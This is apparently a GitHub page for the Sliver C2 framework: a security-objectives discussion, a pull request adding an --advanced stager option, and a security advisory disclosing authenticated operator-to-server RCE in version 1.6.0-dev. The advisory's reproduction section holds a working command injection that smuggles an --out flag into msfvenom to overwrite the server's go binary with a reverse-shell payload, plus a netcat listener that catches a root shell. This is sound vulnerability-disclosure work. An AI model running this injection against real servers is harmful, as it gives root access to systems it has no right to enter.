| Example considerations (non exhaustive list):   * Attacker has access to the source (once we open source the project) * Multiplayer: unauthorized access to a sliver server * Unauthorized access to running agents (i.e: ability to spoof the server / send commands to running slivers) * RCE via logged in operator (might be worth to check for escape shell issues in the `generate` and `msf` commands) * ... |

| We may want to document specific security objectives. As you stated, to me there is a clear security boundary between the operator and server, an operator should not inherently be able to run commands or code on the server. I also added an "audit log" to the server for a white team to review, which records all of the (remote) operator's commands that relies on this boundary. |

| Totally agree with this. Also, I don't know the status for other projects, but I think putting detailed GitHub issues with the **security** label could be enough for the reporting part. |

### @RafBishopFox **[RafBishopFox](/RafBishopFox)** commented [Jun 5, 2023](#issue-1742202640)

Addresses [#1209](https://github.com/BishopFox/sliver/issues/1209). Added a new option `-d` / `--advanced` to `generate msf-stager` to allow the operator to specify advanced options for the stager through `msfvenom`, such as a Host Header or proxy.

Also updated the help text for `generate msf-stager` to reflect the change from `generate stager` to `generate msf-stager` and explain the new `--advanced` option.

Sorry, something went wrong.

# Authenticated Operator-to-Server RCE

Moderate

[moloch--](/moloch--)
published
GHSA-hc5w-gxxr-w8x8
Jul 18, 2024

## Package

No package listed

## Affected versions

1.6.0-dev

## Patched versions

v1.6.0 (d8ff642)

## Description

## Description

Sliver version 1.6.0 (prerelease) is vulnerable to RCE on the teamserver by a low-privileged "operator" user. The RCE is as the system root user.

The exploit is pretty fun as we make the Sliver server pwn itself.

## Impact

As described in a [past issue](https://github.com/BishopFox/sliver/issues/65), "there is a clear security boundary between the operator and server, an operator should not inherently be able to run commands or code on the server." An operator who exploited this vulnerability would be able to view all console logs, kick all other operators, view and modify files stored on the server, and ultimately delete the server.

I've marked it as High as I love good beer.

## Reproduction

First configure the Sliver server [in multiplayer mode and add an operator profile](https://sliver.sh/docs?name=Multi-player+Mode).

Next, compile a slightly older version of the Sliver client. The commit after [5016fb8](https://github.com/BishopFox/sliver/commit/5016fb8d7cdff38c79e22e8293e58300f8d3bd57) updates the Cobra command-line parsing library in the Sliver client to strictly validate command flags.

```
git checkout 5016fb8d
VERSION=1.6.0 make client

```

The latest server version is targeted:

```
All hackers gain exalted
[*] Server v1.6.0 - bdfd89167dd47aece2397c638d482f94f3f91cba
[*] Client 1.6.0 - 5016fb8d7cdff38c79e22e8293e58300f8d3bd57
[*] Welcome to the sliver shell, please type 'help' for options`

```

The exploit uses a command injection in the `generate msf-stager` to inject the `--out` flag to `msfvenom`. We overwrite Sliver's own go binary at `/root/.sliver/go/bin/go`:

```
sliver > generate msf-stager --lhost 192.168.0.128 --lport 8888 --advanced --platform=linux&--payload=linux/x64/shell_reverse_tcp&--format=elf&--out=/root/.sliver/go/bin/go

[*] Sliver implant stager saved to: [...]

```

The other injected flags are to force a Linux payload, and not necessary if running the Sliver server on Windows.

If you check the saved implant locally on the client, it's 0 bytes as the output got written to the file on the server instead.

On the attacking machine, setup a netcat shell:

```
$ nc -lvp 8888
Listening on 0.0.0.0 8888

```

Trigger the stager by running a command which executes `/root/.sliver/go/bin/go`:

```
sliver > generate beacon --mtls 1.2.3.4
[*] Generating new windows/amd64 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
 ⠼  Compiling, please wait ...

```

A root shell will pop:

```
$ nc -lvp 8888
Listening on 0.0.0.0 8888
Connection received on 192.168.0.183 39238
whoami
root

```

The vulnerable code was introduced in [#1281](https://github.com/BishopFox/sliver/pull/1281)
